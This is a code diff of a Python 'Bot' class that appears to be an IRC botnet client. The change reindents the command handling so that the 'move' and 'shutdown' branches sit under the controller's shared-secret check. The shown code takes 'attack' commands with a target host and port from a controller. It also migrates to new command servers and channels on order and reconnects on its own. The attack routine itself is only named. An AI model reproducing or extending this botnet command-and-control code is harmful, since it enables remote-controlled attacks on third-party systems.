@@ -172,7 +172,7 @@ class Bot:
             eprint("Waiting 10 seconds before reconnect...")
             sys.stdout.flush()
             time.sleep(10)
-            pass
+            
 
         #if we haven't received the shutdown command, boot 'er back up
         if not self._shutdown:
@@ -193,10 +193,9 @@ class Bot:
                 return
             
             secret = msgParts[0]
-
             if secret == self._secret:
                 command = msgParts[1]
-                
+                                
                 print("Controller requested we run command: {0}".format(command))
                 if command == "attack":
                     eprint(msgParts)
@@ -217,25 +216,25 @@ class Bot:
                             eprint("Something went wrong. Ignoring attack command")
                     else:
                         eprint("Ignoring attack command. Wrong formatting.")
-            elif command == "move":
-                if len(msgParts) == 5:
-                    server = msgParts[2]
-                    channel = msgParts[4]
-                    try:
-                        port = int(msgParts[3])
-                        if port >= 1 and port <= 65535:
-                            #handle server name resolution
-                            self._server = self.domain_resolution(server)
-                            self._port = port
-                            self._channel = '#'+channel
-                            self._socket.send("QUIT\r\n".encode("utf-8"))
-                        else:
-                            eprint("Ignoring move command. Port not between 1 and 65535.")
-                    except:
-                        eprint(traceback.format_exc())
-                        eprint("Ignoring move command. Port malformed.")   
-            elif command == "shutdown":
-                self._shutdown = True
+                elif command == "move":
+                    if len(msgParts) == 5:
+                        server = msgParts[2]
+                        channel = msgParts[4]
+                        try:
+                            port = int(msgParts[3])
+                            if port >= 1 and port <= 65535:
+                                #handle server name resolution
+                                self._server = self.domain_resolution(server)
+                                self._port = port
+                                self._channel = '#'+channel
+                                self._socket.send("QUIT\r\n".encode("utf-8"))
+                            else:
+                                eprint("Ignoring move command. Port not between 1 and 65535.")
+                        except:
+                            eprint(traceback.format_exc())
+                            eprint("Ignoring move command. Port malformed.")   
+                elif command == "shutdown":
+                    self._shutdown = True
 
 
     def performAttack(self, host, port, sender):
